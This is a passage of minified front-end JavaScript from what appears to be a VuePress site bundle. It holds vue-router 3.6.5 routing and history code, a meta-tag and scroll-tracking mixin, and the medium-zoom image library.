u=Array.isArray(r.alias)?r.alias:[r.alias],m=0;m<u.length;++m){0;var h={path:u[m],children:r.children};n(e,t,a,h,o,d.path||"/")}l&&(a[l]||(a[l]=d))}(o,i,s,n,r)}));for(var l=0,c=o.length;l<c;l++)"*"===o[l]&&(o.push(o.splice(l,1)[0]),c--,l--);return{pathList:o,pathMap:i,nameMap:s}}function K(n,e){return P(n,[],e)}function Z(n,e){var t=X(n),a=t.pathList,r=t.pathMap,o=t.nameMap;function i(n,t,i){var s=W(n,t,!1,e),c=s.name;if(c){var p=o[c];if(!p)return l(null,s);var d=p.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var u in t.params)!(u in s.params)&&d.indexOf(u)>-1&&(s.params[u]=t.params[u]);return s.path=$(p.path,s.params),l(p,s,i)}if(s.path){s.params={};for(var m=0;m<a.length;m++){var h=a[m],g=r[h];if(Y(g.regex,s.path,s.params))return l(g,s,i)}}return l(null,s)}function s(n,t){var a=n.redirect,r="function"==typeof a?a(h(n,t,null,e)):a;if("string"==typeof r&&(r={path:r}),!r||"object"!=typeof r)return l(null,t);var s=r,c=s.name,p=s.path,d=t.query,u=t.hash,m=t.params;if(d=s.hasOwnProperty("query")?s.query:d,u=s.hasOwnProperty("hash")?s.hash:u,m=s.hasOwnProperty("params")?s.params:m,c){o[c];return i({_normalized:!0,name:c,query:d,hash:u,params:m},void 0,t)}if(p){var g=function(n,e){return C(n,e.parent?e.parent.path:"/",!0)}(p,n);return i({_normalized:!0,path:$(g,m),query:d,hash:u},void 0,t)}return l(null,t)}function l(n,t,a){return n&&n.redirect?s(n,a||t):n&&n.matchAs?function(n,e,t){var a=i({_normalized:!0,path:$(t,e.params)});if(a){var r=a.matched,o=r[r.length-1];return e.params=a.params,l(o,e)}return l(null,e)}(0,t,n.matchAs):h(n,t,a,e)}return{match:i,addRoute:function(n,e){var t="object"!=typeof n?o[n]:void 0;X([e||n],a,r,o,t),t&&t.alias.length&&X(t.alias.map((function(n){return{path:n,children:[e]}})),a,r,o,t)},getRoutes:function(){return a.map((function(n){return r[n]}))},addRoutes:function(n){X(n,a,r,o)}}}function Y(n,e,t){var a=e.match(n);if(!a)return!1;if(!t)return!0;for(var r=1,o=a.length;r<o;++r){var i=n.keys[r-1];i&&(t[i.name||"pathMatch"]="string"==typeof a[r]?c(a[r]):a[r])}return!0}var nn=G&&window.performance&&window.performance.now?window.performance:Date;function en(){return nn.now().toFixed(3)}var tn=en();function an(){return tn}function rn(n){return tn=n}var on=Object.create(null);function sn(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=r({},window.history.state);return t.key=an(),window.history.replaceState(t,"",e),window.addEventListener("popstate",pn),function(){window.removeEventListener("popstate",pn)}}function ln(n,e,t,a){if(n.app){var r=n.options.scrollBehavior;r&&n.app.$nextTick((function(){var o=function(){var n=an();if(n)return on[n]}(),i=r.call(n,e,t,a?o:null);i&&("function"==typeof i.then?i.then((function(n){gn(n,o)})).catch((function(n){0})):gn(i,o))}))}}function cn(){var n=an();n&&(on[n]={x:window.pageXOffset,y:window.pageYOffset})}function pn(n){cn(),n.state&&n.state.key&&rn(n.state.key)}function dn(n){return mn(n.x)||mn(n.y)}function un(n){return{x:mn(n.x)?n.x:window.pageXOffset,y:mn(n.y)?n.y:window.pageYOffset}}function mn(n){return"number"==typeof n}var hn=/^#\d/;function gn(n,e){var t,a="object"==typeof n;if(a&&"string"==typeof n.selector){var r=hn.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(r){var o=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),a=n.getBoundingClientRect();return{x:a.left-t.left-e.x,y:a.top-t.top-e.y}}(r,o={x:mn((t=o).x)?t.x:0,y:mn(t.y)?t.y:0})}else dn(n)&&(e=un(n))}else a&&dn(n)&&(e=un(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var fn,bn=G&&((-1===(fn=window.navigator.userAgent).indexOf("Android 2.")&&-1===fn.indexOf("Android 4.0")||-1===fn.indexOf("Mobile Safari")||-1!==fn.indexOf("Chrome")||-1!==fn.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function vn(n,e){cn();var t=window.history;try{if(e){var a=r({},t.state);a.key=an(),t.replaceState(a,"",n)}else t.pushState({key:rn(en())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function yn(n){vn(n,!0)}var xn={redirected:2,aborted:4,cancelled:8,duplicated:16};function wn(n,e){return Sn(n,e,xn.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return Cn.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function kn(n,e){return Sn(n,e,xn.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function Sn(n,e,t,a){var r=new Error(a);return r._isRouter=!0,r.from=n,r.to=e,r.type=t,r}var Cn=["params","query","hash"];function Tn(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function jn(n,e){return Tn(n)&&n._isRouter&&(null==e||n.type===e)}function Pn(n,e,t){var a=function(r){r>=n.length?t():n[r]?e(n[r],(function(){a(r+1)})):a(r+1)};a(0)}function An(n){return function(e,t,a){var r=!1,o=0,i=null;En(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){r=!0,o++;var l,c=In((function(e){var r;((r=e).__esModule||Bn&&"Module"===r[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:H.extend(e),t.components[s]=e,--o<=0&&a()})),p=In((function(n){var e="Failed to resolve async component "+s+": "+n;i||(i=Tn(n)?n:new Error(e),a(i))}));try{l=n(c,p)}catch(n){p(n)}if(l)if("function"==typeof l.then)l.then(c,p);else{var d=l.component;d&&"function"==typeof d.then&&d.then(c,p)}}})),r||a()}}function En(n,e){return _n(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function _n(n){return Array.prototype.concat.apply([],n)}var Bn="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function In(n){var e=!1;return function(){for(var t=[],a=arguments.length;a--;)t[a]=arguments[a];if(!e)return e=!0,n.apply(this,t)}}var zn=function(n,e){this.router=n,this.base=function(n){if(!n)if(G){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=f,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function Dn(n,e,t,a){var r=En(n,(function(n,a,r,o){var i=function(n,e){"function"!=typeof n&&(n=H.extend(n));return n.options[e]}(n,e);if(i)return Array.isArray(i)?i.map((function(n){return t(n,a,r,o)})):t(i,a,r,o)}));return _n(a?r.reverse():r)}function Fn(n,e){if(e)return function(){return n.apply(e,arguments)}}zn.prototype.listen=function(n){this.cb=n},zn.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},zn.prototype.onError=function(n){this.errorCbs.push(n)},zn.prototype.transitionTo=function(n,e,t){var a,r=this;try{a=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var o=this.current;this.confirmTransition(a,(function(){r.updateRoute(a),e&&e(a),r.ensureURL(),r.router.afterHooks.forEach((function(n){n&&n(a,o)})),r.ready||(r.ready=!0,r.readyCbs.forEach((function(n){n(a)})))}),(function(n){t&&t(n),n&&!r.ready&&(jn(n,xn.redirected)&&o===f||(r.ready=!0,r.readyErrorCbs.forEach((function(e){e(n)}))))}))},zn.prototype.confirmTransition=function(n,e,t){var a=this,r=this.current;this.pending=n;var o=function(n){!jn(n)&&Tn(n)&&(a.errorCbs.length?a.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},i=n.matched.length-1,s=r.matched.length-1;if(y(n,r)&&i===s&&n.matched[i]===r.matched[s])return this.ensureURL(),n.hash&&ln(this.router,r,n,!1),o(function(n,e){var t=Sn(n,e,xn.duplicated,'Avoided redundant navigation to current location: "'+n.fullPath+'".');return t.name="NavigationDuplicated",t}(r,n));var l=function(n,e){var t,a=Math.max(n.length,e.length);for(t=0;t<a&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),c=l.updated,p=l.deactivated,d=l.activated,u=[].concat(function(n){return Dn(n,"beforeRouteLeave",Fn,!0)}(p),this.router.beforeHooks,function(n){return Dn(n,"beforeRouteUpdate",Fn)}(c),d.map((function(n){return n.beforeEnter})),An(d)),m=function(e,t){if(a.pending!==n)return o(kn(r,n));try{e(n,r,(function(e){!1===e?(a.ensureURL(!0),o(function(n,e){return Sn(n,e,xn.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(r,n))):Tn(e)?(a.ensureURL(!0),o(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(o(wn(r,n)),"object"==typeof e&&e.replace?a.replace(e):a.push(e)):t(e)}))}catch(n){o(n)}};Pn(u,m,(function(){Pn(function(n){return Dn(n,"beforeRouteEnter",(function(n,e,t,a){return function(n,e,t){return function(a,r,o){return n(a,r,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),o(n)}))}}(n,t,a)}))}(d).concat(a.router.resolveHooks),m,(function(){if(a.pending!==n)return o(kn(r,n));a.pending=null,e(n),a.router.app&&a.router.app.$nextTick((function(){w(n)}))}))}))},zn.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},zn.prototype.setupListeners=function(){},zn.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=f,this.pending=null};var On=function(n){function e(e,t){n.call(this,e,t),this._startLocation=Ln(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,a=bn&&t;a&&this.listeners.push(sn());var r=function(){var t=n.current,r=Ln(n.base);n.current===f&&r===n._startLocation||n.transitionTo(r,(function(n){a&&ln(e,n,t,!0)}))};window.addEventListener("popstate",r),this.listeners.push((function(){window.removeEventListener("popstate",r)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var a=this,r=this.current;this.transitionTo(n,(function(n){vn(T(a.base+n.fullPath)),ln(a.router,n,r,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var a=this,r=this.current;this.transitionTo(n,(function(n){yn(T(a.base+n.fullPath)),ln(a.router,n,r,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(Ln(this.base)!==this.current.fullPath){var e=T(this.base+this.current.fullPath);n?vn(e):yn(e)}},e.prototype.getCurrentLocation=function(){return Ln(this.base)},e}(zn);function Ln(n){var e=window.location.pathname,t=e.toLowerCase(),a=n.toLowerCase();return!n||t!==a&&0!==t.indexOf(T(a+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var Mn=function(n){function e(e,t,a){n.call(this,e,t),a&&function(n){var e=Ln(n);if(!/^\/#/.test(e))return window.location.replace(T(n+"/#"+e)),!0}(this.base)||Nn()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=bn&&e;t&&this.listeners.push(sn());var a=function(){var e=n.current;Nn()&&n.transitionTo(Rn(),(function(a){t&&ln(n.router,a,e,!0),bn||$n(a.fullPath)}))},r=bn?"popstate":"hashchange";window.addEventListener(r,a),this.listeners.push((function(){window.removeEventListener(r,a)}))}},e.prototype.push=function(n,e,t){var a=this,r=this.current;this.transitionTo(n,(function(n){Un(n.fullPath),ln(a.router,n,r,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var a=this,r=this.current;this.transitionTo(n,(function(n){$n(n.fullPath),ln(a.router,n,r,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;Rn()!==e&&(n?Un(e):$n(e))},e.prototype.getCurrentLocation=function(){return Rn()},e}(zn);function Nn(){var n=Rn();return"/"===n.charAt(0)||($n("/"+n),!1)}function Rn(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function qn(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function Un(n){bn?vn(qn(n)):window.location.hash=n}function $n(n){bn?yn(qn(n)):window.location.replace(qn(n))}var Wn=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var a=this;this.transitionTo(n,(function(n){a.stack=a.stack.slice(0,a.index+1).concat(n),a.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var a=this;this.transitionTo(n,(function(n){a.stack=a.stack.slice(0,a.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var a=this.stack[t];this.confirmTransition(a,(function(){var n=e.current;e.index=t,e.updateRoute(a),e.router.afterHooks.forEach((function(e){e&&e(a,n)}))}),(function(n){jn(n,xn.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(zn),Hn=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Z(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!bn&&!1!==n.fallback,this.fallback&&(e="hash"),G||(e="abstract"),this.mode=e,e){case"history":this.history=new On(this,n.base);break;case"hash":this.history=new Mn(this,n.base,this.fallback);break;case"abstract":this.history=new Wn(this,n.base);break;default:0}},Vn={currentRoute:{configurable:!0}};Hn.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},Vn.currentRoute.get=function(){return this.history&&this.history.current},Hn.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof On||t instanceof Mn){var a=function(n){t.setupListeners(),function(n){var a=t.current,r=e.options.scrollBehavior;bn&&r&&"fullPath"in n&&ln(e,n,a,!1)}(n)};t.transitionTo(t.getCurrentLocation(),a,a)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},Hn.prototype.beforeEach=function(n){return Qn(this.beforeHooks,n)},Hn.prototype.beforeResolve=function(n){return Qn(this.resolveHooks,n)},Hn.prototype.afterEach=function(n){return Qn(this.afterHooks,n)},Hn.prototype.onReady=function(n,e){this.history.onReady(n,e)},Hn.prototype.onError=function(n){this.history.onError(n)},Hn.prototype.push=function(n,e,t){var a=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){a.history.push(n,e,t)}));this.history.push(n,e,t)},Hn.prototype.replace=function(n,e,t){var a=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){a.history.replace(n,e,t)}));this.history.replace(n,e,t)},Hn.prototype.go=function(n){this.history.go(n)},Hn.prototype.back=function(){this.go(-1)},Hn.prototype.forward=function(){this.go(1)},Hn.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},Hn.prototype.resolve=function(n,e,t){var a=W(n,e=e||this.history.current,t,this),r=this.match(a,e),o=r.redirectedFrom||r.fullPath;return{location:a,route:r,href:function(n,e,t){var a="hash"===t?"#"+e:e;return n?T(n+"/"+a):a}(this.history.base,o,this.mode),normalizedTo:a,resolved:r}},Hn.prototype.getRoutes=function(){return this.matcher.getRoutes()},Hn.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==f&&this.history.transitionTo(this.history.getCurrentLocation())},Hn.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==f&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(Hn.prototype,Vn);var Jn=Hn;function Qn(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}Hn.install=function n(e){if(!n.installed||H!==e){n.installed=!0,H=e;var t=function(n){return void 0!==n},a=function(n,e){var a=n.$options._parentVnode;t(a)&&t(a=a.data)&&t(a=a.registerRouteInstance)&&a(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,a(this,this)},destroyed:function(){a(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",k),e.component("RouterLink",J);var r=e.config.optionMergeStrategies;r.beforeRouteEnter=r.beforeRouteLeave=r.beforeRouteUpdate=r.created}},Hn.version="3.6.5",Hn.isNavigationFailure=jn,Hn.NavigationFailureType=xn,Hn.START_LOCATION=f,G&&window.Vue&&window.Vue.use(Hn);t(70),t(29),t(71);var Gn=t(0),Xn=t(160),Kn=t.n(Xn),Zn=t(161),Yn=t.n(Zn),ne={created(){if(this.siteMeta=this.$site.headTags.filter(([n])=>"meta"===n).map(([n,e])=>e),this.$ssrContext){const e=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(n=e)?n.map(n=>{let e="<meta";return Object.keys(n).forEach(t=>{e+=` ${t}="${Yn()(n[t])}"`}),e+">"}).join("\n    "):"",this.$ssrContext.canonicalLink=te(this.$canonicalUrl)}var n},mounted(){this.currentMetaTags=[...document.querySelectorAll("meta")],this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta(){document.title=this.$title,document.documentElement.lang=this.$lang;const n=this.getMergedMetaTags();this.currentMetaTags=ae(n,this.currentMetaTags)},getMergedMetaTags(){const n=this.$page.frontmatter.meta||[];return Kn()([{name:"description",content:this.$description}],n,this.siteMeta,re)},updateCanonicalLink(){ee(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",te(this.$canonicalUrl))}},watch:{$page(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy(){ae(null,this.currentMetaTags),ee()}};function ee(){const n=document.querySelector("link[rel='canonical']");n&&n.remove()}function te(n=""){return n?`<link href="${n}" rel="canonical" />`:""}function ae(n,e){if(e&&[...e].filter(n=>n.parentNode===document.head).forEach(n=>document.head.removeChild(n)),n)return n.map(n=>{const e=document.createElement("meta");return Object.keys(n).forEach(t=>{e.setAttribute(t,n[t])}),document.head.appendChild(e),e})}function re(n){for(const e of["name","property","itemprop"])if(n.hasOwnProperty(e))return n[e]+e;return JSON.stringify(n)}t(59);var oe=t(162),ie={mounted(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(oe)()((function(){this.setActiveHash()}),300),setActiveHash(){const n=[].slice.call(document.querySelectorAll(".sidebar-link")),e=[].slice.call(document.querySelectorAll(".header-anchor")).filter(e=>n.some(n=>n.hash===e.hash)),t=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),r=window.innerHeight+t;for(let n=0;n<e.length;n++){const o=e[n],i=e[n+1],s=0===n&&0===t||t>=o.parentElement.offsetTop+10&&(!i||t<i.parentElement.offsetTop-10),l=decodeURIComponent(this.$route.hash);if(s&&l!==decodeURIComponent(o.hash)){const t=o;if(r===a)for(let t=n+1;t<e.length;t++)if(l===decodeURIComponent(e[t].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(t.hash),()=>{this.$nextTick(()=>{this.$vuepress.$set("disableScrollBehavior",!1)})})}}}},beforeDestroy(){window.removeEventListener("scroll",this.onScroll)}},se=(t(328),Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var a in t)Object.prototype.hasOwnProperty.call(t,a)&&(n[a]=t[a])}return n}),le=function(n){return"IMG"===n.tagName},ce=function(n){return n&&1===n.nodeType},pe=function(n){return".svg"===(n.currentSrc||n.src).substr(-4).toLowerCase()},de=function(n){try{return Array.isArray(n)?n.filter(le):function(n){return NodeList.prototype.isPrototypeOf(n)}(n)?[].slice.call(n).filter(le):ce(n)?[n].filter(le):"string"==typeof n?[].slice.call(document.querySelectorAll(n)).filter(le):[]}catch(n){throw new TypeError("The provided selector is invalid.\nExpects a CSS selector, a Node element, a NodeList or an array.\nSee: https://github.com/francoischalifour/medium-zoom")}},ue=function(n){var e=document.createElement("div");return e.classList.add("medium-zoom-overlay"),e.style.background=n,e},me=function(n){var e=n.getBoundingClientRect(),t=e.top,a=e.left,r=e.width,o=e.height,i=n.cloneNode(),s=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,l=window.pageXOffset||document.documentElement.scrollLeft||document.body.scrollLeft||0;return i.removeAttribute("id"),i.style.position="absolute",i.style.top=t+s+"px",i.style.left=a+l+"px",i.style.width=r+"px",i.style.height=o+"px",i.style.transform="",i},he=function(n,e){var t=se({bubbles:!1,cancelable:!1,detail:void 0},e);if("function"==typeof window.CustomEvent)return new CustomEvent(n,t);var a=document.createEvent("CustomEvent");return a.initCustomEvent(n,t.bubbles,t.cancelable,t.detail),a};!function(n,e){void 0===e&&(e={});var t=e.insertAt;if(n&&"undefined"!=typeof document){var a=document.head||document.getElementsByTagName("head")[0],r=document.createElement("style");r.type="text/css","top"===t&&a.firstChild?a.insertBefore(r,a.firstChild):a.appendChild(r),r.styleSheet?r.styleSheet.cssText=n:r.appendChild(document.createTextNode(n))}}(".medium-zoom-overlay{position:fixed;top:0;right:0;bottom:0;left:0;opacity:0;transition:opacity .3s;will-change:opacity}.medium-zoom--opened .medium-zoom-overlay{cursor:pointer;cursor:zoom-out;opacity:1}.medium-zoom-image{cursor:pointer;cursor:zoom-in;transition:transform .3s cubic-bezier(.2,0,.2,1)!important}.medium-zoom-image--hidden{visibility:hidden}.medium-zoom-image--opened{position:relative;cursor:pointer;cursor:zoom-out;will-change:transform}");var ge=function n(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},a=window.Promise||function(n){function e(){}n(e,e)},r=function(n){var e=n.target;e!==T?-1!==y.indexOf(e)&&g({target:e}):h()},o=function(){if(!w&&C.original){var n=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0;Math.abs(k-n)>S.scrollOffset&&setTimeout(h,150)}},i=function(n){var e=n.key||n.keyCode;"Escape"!==e&&"Esc"!==e&&27!==e||h()},s=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n;if(n.background&&(T.style.background=n.background),n.container&&n.container instanceof Object&&(e.container=se({},S.container,n.container)),n.template){var t=ce(n.template)?n.template:document.querySelector(n.template);e.template=t}return S=se({},S,e),y.forEach((function(n){n.dispatchEvent(he("medium-zoom:update",{detail:{zoom:j}}))})),j},l=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return n(se({},S,e))},c=function(){for(var n=arguments.length,e=Array(n),t=0;t<n;t++)e[t]=arguments[t];var a=e.reduce((function(n,e){return[].concat(n,de(e))}),[]);return a.filter((function(n){return-1===y.indexOf(n)})).forEach((function(n){y.push(n),n.classList.add("medium-zoom-image")})),x.forEach((function(n){var e=n.type,t=n.listener,r=n.options;a.forEach((function(n){n.addEventListener(e,t,r)}))})),j},p=function(){for(var n=arguments.length,e=Array(n),t=0;t<n;t++)e[t]=arguments[t];C.zoomed&&h();var a=e.length>0?e.reduce((function(n,e){return[].concat(n,de(e))}),[]):y;return a.forEach((function(n){n.classList.remove("medium-zoom-image"),n.dispatchEvent(he("medium-zoom:detach",{detail:{zoom:j}}))})),y=y.filter((function(n){return-1===a.indexOf(n)})),j},d=function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return y.forEach((function(a){a.addEventListener("medium-zoom:"+n,e,t)})),x.push({type:"medium-zoom:"+n,listener:e,options:t}),j},u=function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return y.forEach((function(a){a.removeEventListener("medium-zoom:"+n,e,t)})),x=x.filter((function(t){return!(t.type==="medium-zoom:"+n&&t.listener.toString()===e.toString())})),j},m=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n.target,t=function(){var n={width:document.documentElement.clientWidth,height:document.documentElement.clientHeight,left:0,top:0,right:0,bottom:0},e=void 0,t=void 0;if(S.container)if(S.container instanceof Object)e=(n=se({},n,S.container)).width-n.left-n.right-2*S.margin,t=n.height-n.top-n.bottom-2*S.margin;else{var a=(ce(S.container)?S.container:document.querySelector(S.container)).getBoundingClientRect(),r=a.width,o=a.height,i=a.left,s=a.top;n=se({},n,{width:r,height:o,left:i,top:s})}e=e||n.width-2*S.margin,t=t||n.height-2*S.margin;var l=C.zoomedHd||C.original,c=pe(l)?e:l.naturalWidth||e,p=pe(l)?t:l.naturalHeight||t,d=l.getBoundingClientRect(),u=d.top,m=d.left,h=d.width,g=d.height,f=Math.min(Math.max(h,c),e)/h,b=Math.min(Math.max(g,p),t)/g,v=Math.min(f,b),y="scale("+v+") translate3d("+((e-h)/2-m+S.margin+n.left)/v+"px, "+((t-g)/2-u+S.margin+n.top)/v+"px, 0)";C.zoomed.style.transform=y,C.zoomedHd&&(C.zoomedHd.style.transform=y)};return new a((function(n){if(e&&-1===y.indexOf(e))n(j);else{if(C.zoomed)n(j);else{if(e)C.original=e;else{if(!(y.length>0))return void n(j);var a=y;C.original=a[0]}if(C.original.dispatchEvent(he("medium-zoom:open",{detail:{zoom:j}})),k=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,w=!0,C.zoomed=me(C.original),document.body.appendChild(T),S.template){var r=ce(S.template)?S.template:document.querySelector(S.template);C.template=document.createElement("div"),C.template.appendChild(r.content.cloneNode(!0)),document.body.appendChild(C.template)}if(C.original.parentElement&&"PICTURE"===C.original.parentElement.tagName&&C.original.currentSrc&&(C.zoomed.src=C.original.currentSrc),document.body.appendChild(C.zoomed),window.requestAnimationFrame((function(){document.body.classList.add("medium-zoom--opened")})),C.original.classList.add("medium-zoom-image--hidden"),C.zoomed.classList.add("medium-zoom-image--opened"),C.zoomed.addEventListener("click",h),C.zoomed.addEventListener("transitionend",(function e(){w=!1,C.zoomed.removeEventListener("transitionend",e),C.original.dispatchEvent(he("medium-zoom:opened",{detail:{zoom:j}})),n(j)})),C.original.getAttribute("data-zoom-src")){C.zoomedHd=C.zoomed.cloneNode(),C.zoomedHd.removeAttribute("srcset"),C.zoomedHd.removeAttribute("sizes"),C.zoomedHd.removeAttribute("loading"),C.zoomedHd.src=C.zoomed.getAttribute("data-zoom-src"),C.zoomedHd.onerror=function(){clearInterval(o),console.warn("Unable to reach the zoom image target "+C.zoomedHd.src),C.zoomedHd=null,t()};var o=setInterval((function(){C.zoomedHd.complete&&(clearInterval(o),C.zoomedHd.classList.add("medium-zoom-image--opened"),C.zoomedHd.addEventListener("click",h),document.body.appendChild(C.zoomedHd),t())}),10)}else if(C.original.hasAttribute("srcset")){C.zoomedHd=C.zoomed.cloneNode(),C.zoomedHd.removeAttribute("sizes"),C.zoomedHd.removeAttribute("loading");var i=C.zoomedHd.addEventListener("load",(function(){C.zoomedHd.removeEventListener("load",i),C.zoomedHd.classList.add("medium-zoom-image--opened"),C.zoomedHd.addEventListener("click",h),document.body.appendChild(C.zoomedHd),t()}))}else t()}}}))},h=function(){return new a((function(n){if(!w&&C.original){w=!0,document.body.classList.remove("medium-zoom--opened"),C.zoomed.style.transform="",C.zoomedHd&&(C.zoomedHd.style.transform=""),C.template&&(C.template.style.transition="opacity 150ms",C.template.style.opacity=0),C.original.dispatchEvent(he("medium-zoom:close",{detail:{zoom:j}})),C.zoomed.addEventListener("transitionend",(function e(){C.original.classList.remove("medium-zoom-image--hidden"),document.body.removeChild(C.zoomed),C.zoomedHd&&document.body.removeChild(C.zoomedHd),document.body.removeChild(T),C.zoomed.classList.remove("medium-zoom-image--opened"),C.template&&document.body.removeChild(C.template),w=!1,C.zoomed.removeEventListener("transitionend",e),C.original.dispatchEvent(he("medium-zoom:closed",{detail:{zoom:j}})),C.original=null,C.zoomed=null,C.zoomedHd=null,C.template=null,n(j)}))}else n(j)}))},g=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n.target;return C.original?h():m({target:e})},f=function(){return S},b=function(){return y},v=function(){return C.original},y=[],x=[],w=!1,k=0,S=t,C={original:null,zoomed:null,zoomedHd:null,template:null};"[object Object]"===Object.prototype.toString.call(e)?S=e:(e||"string"==typeof e)&&c(e),S=se({margin:0,background:"#fff",scrollOffset:40,container:null,template:null},S);var 